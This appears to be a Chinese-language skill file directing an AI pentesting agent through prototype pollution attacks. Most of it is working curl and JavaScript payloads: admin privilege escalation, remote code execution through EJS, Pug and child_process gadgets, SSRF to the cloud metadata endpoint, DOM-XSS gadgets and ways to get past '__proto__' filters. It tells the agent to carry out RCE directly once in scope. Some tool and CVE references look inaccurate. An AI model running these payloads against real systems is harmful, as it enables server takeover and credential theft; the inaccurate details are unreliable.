---
name: 祖型污
description: >-
 Prototype Pollution 完整手法：客户端 DOM-XSS via PP、
 服务端 Node.js PP RCE（AST Injection、Template Injection）、
 JSON merge/set 函数污染、lodash/deepmerge 漏洞、
 PP → 权限绕过、PP → SSRF、Gadget 链构造。
 
 纯客户端 XSS 走 xss-exploit；Node.js RCE 后走 linux-post-exploit。
version: 1.0.0
---

# Prototype Pollution 完整手法

## 作业入口（先跑这个）

```bash
python3 炼蛊房/param_abuse_probe.py proto --url https://授权/api/settings --case <案>
```

作业手法：`传承/祖型污.md`。标记进 JSON **键**才算 L2。

**前提**：目标在 `授权范围`。PP RCE 为 L3，授权内直接做。

---

## §1 识别与检测

### 客户端 PP 检测

```javascript
// 浏览器控制台测试
// 1. URL 参数污染
// 访问 https://站/?__proto__[admin]=1
console.log(({}).admin); // → "1" = 客户端 PP 存在

// 2. 常见污染向量
// ?__proto__[isAdmin]=true
// ?constructor[prototype][isAdmin]=true
// Hash: #__proto__[alert]=1

// 3. DOM Clobbering 联合
// 表单/URL 参数解析库（qs、URLSearchParams 自定义实现）
```

```bash
# 自动化检测
npm install -g @nicolo-ribaudo/babel-plugin-proposal-proto
# 或用 Burp 插件 prototype-pollution-scanner

# 发送测试 payload
curl -s "https://授权站/?__proto__[test]=polluted" -v
curl -s "https://授权站/" -H "Content-Type: application/json" \
 -d '{"__proto__":{"test":"polluted"}}' -v

# 或通过 JSON body
curl -s "https://授权站/api/user/update" \
 -H "Content-Type: application/json" \
 -H "Authorization: Bearer $TOKEN" \
 -d '{"__proto__":{"isAdmin":true}}'
```

---

## §2 服务端 PP（Node.js）

### lodash 系列漏洞（高频）

```javascript
// lodash.merge <= 4.17.11 (CVE-2019-10744)
const _ = require('lodash');
_.merge({}, JSON.parse('{"__proto__":{"isAdmin":true}}'));
console.log({}.isAdmin); // → true

// lodash.set
_.set({}, '__proto__.isAdmin', true);

// lodash.defaultsDeep
_.defaultsDeep({}, JSON.parse('{"constructor":{"prototype":{"isAdmin":true}}}'));
```

```bash
# 探测 lodash 版本（通过错误信息）
curl -s "https://授权站/api/config" -d '{"__proto__":{"test":1}}'

# 全量测试向量
for payload in \
 '{"__proto__":{"isAdmin":true}}' \
 '{"constructor":{"prototype":{"isAdmin":true}}}' \
 '{"__proto__":{"admin":1,"role":"admin"}}'; do
 echo "Testing: $payload"
 curl -s "https://授权站/api/user/update" \
 -H "Content-Type: application/json" \
 -H "Authorization: Bearer $TOKEN" \
 -d "$payload"
 echo ""
done
```

### deepmerge / merge-deep

```javascript
// deepmerge <= 3.3.0
const merge = require('deepmerge');
merge.all([{}, JSON.parse('{"__proto__":{"isAdmin":true}}')]);
```

---

## §3 PP → 权限绕过

```bash
# 污染后鉴权 check 读取 Object.prototype 属性
# 如果服务端: if (req.user.isAdmin) { ... }
# 污染 isAdmin 后所有用户变管理员

# 常见污染目标
curl -s "https://授权站/api/profile/update" \
 -H "Content-Type: application/json" \
 -H "Authorization: Bearer $TOKEN" \
 -d '{"__proto__":{"isAdmin":true,"role":"admin","authorized":true,"verified":true}}'

# 然后访问管理端点
curl -s "https://授权站/api/admin/users" \
 -H "Authorization: Bearer $TOKEN"
```

---

## §4 PP → RCE（AST Injection）

### child_process spawn

```bash
# 目标：Node.js 中用 opts 对象调用 child_process
# 漏洞代码（express-fileupload 举例）：
# req.body.opts → merge into {} → spawn(cmd, args, opts)

# shell 污染（exec 时 shell:true 触发）
curl -s "https://授权站/api/upload" \
 -H "Content-Type: application/json" \
 -d '{"__proto__":{"shell":"node","NODE_OPTIONS":"--require /proc/self/fd/0"}}'

# 或污染 env
curl -s "https://授权站/api/data" \
 -H "Content-Type: application/json" \
 -d '{"__proto__":{"env":{"NODE_OPTIONS":"--require /dev/stdin"},"argv0":"node"}}'
```

### Template Engine Injection via PP

```bash
# Pug/Jade（CVE-2021-23337 lodash + pug）
curl -s "https://授权站/api/render" \
 -H "Content-Type: application/json" \
 -d '{"__proto__":{"block":{"type":"Text","line":"process.mainModule.require('"'"'child_process'"'"').exec('"'"'id>/tmp/pwned'"'"');"}}}'

# EJS
curl -s "https://授权站/api/template" \
 -H "Content-Type: application/json" \
 -d '{"__proto__":{"settings":{"view options":{"outputFunctionName":"x;process.mainModule.require('"'"'child_process'"'"').execSync('"'"'id>/tmp/pwned'"'"')//"}}}}'

# Handlebars (CVE-2019-19919)
curl -s "https://授权站/api/compile" \
 -H "Content-Type: application/json" \
 -d '{"__proto__":{"__defineGetter__":"EXPLOIT"}}'
```

---

## §5 PP → SSRF

```bash
# 污染 HTTP 请求库的 host/headers 选项
curl -s "https://授权站/api/webhook" \
 -H "Content-Type: application/json" \
 -d '{"__proto__":{"host":"169.254.169.254","headers":{"X-SSRF":"1"}}}'

# 污染 axios/got 的 baseURL
curl -s "https://授权站/api/request" \
 -H "Content-Type: application/json" \
 -d '{"__proto__":{"baseURL":"http://169.254.169.254/latest/meta-data/"}}'
```

---

## §6 Gadget 链枚举

```bash
# server-side-prototype-pollution 工具
npm install -g server-side-prototype-pollution
ssp-scan -u https://授权站 -H "Authorization: Bearer $TOKEN" --detect

# ppfuzz（浏览器端）
npm install -g ppfuzz
ppfuzz -u "https://授权站/?param=FUZZ"

# 手工 Gadget 查找
# 在服务端源码中搜索：
# 1. 调用 merge/deepMerge/assign 且来源是用户输入
# 2. exec/spawn/execFile 使用 opts 对象
# 3. 模板引擎 render() 使用用户传入 options
# 4. require() 路径含 prototype 链属性
```

---

## §7 客户端 PP → DOM XSS

```bash
# 通过 URL hash/query 污染 prototype
# 如果页面有：Object.assign({}, urlParams)

# 常见 Gadget（污染后 XSS）
?__proto__[innerHTML]=<img src=x onerror=alert(1)>
?__proto__[src]=1&__proto__[onerror]=alert(1)
?constructor[prototype][eval]=alert

# jQuery 3.x JSONP Gadget
?__proto__[jsonp]=alert(1)&__proto__[dataType]=jsonp

# 工具：DOM Invader（Burp Suite）自动检测客户端 PP + DOM XSS Gadget
```

---

## §8 防御绕过技巧

```javascript
// 有些应用过滤了 __proto__ 字符串
// 绕过方法 1：大写
{"__PROTO__":{"isAdmin":true}}

// 绕过方法 2：Unicode 编码
{"\u005f\u005fproto\u005f\u005f":{"isAdmin":true}}

// 绕过方法 3：constructor 路径
{"constructor":{"prototype":{"isAdmin":true}}}

// 绕过方法 4：嵌套合并
{"a":{"__proto__":{"isAdmin":true}}}

// 绕过方法 5：数组路径
// 当解析 a[__proto__][isAdmin]=1 时
```

---

## 成功口径

| 档 | 条件 |
|----|------|
| L1 | PP 可注入（反射/Observable 侧信道） |
| L2 | 权限绕过成功（isAdmin/role 污染） |
| L3 | RCE 成功 / SSRF 到内网（授权内直接做）|

---

## 真源

- 手法：`传承/祖型污.md`
- 工具：`python3 炼蛊房/param_abuse_probe.py proto --help`
- 长文：`智道藏书/旁支传承/skills/prototype-pollution/SKILL.md`
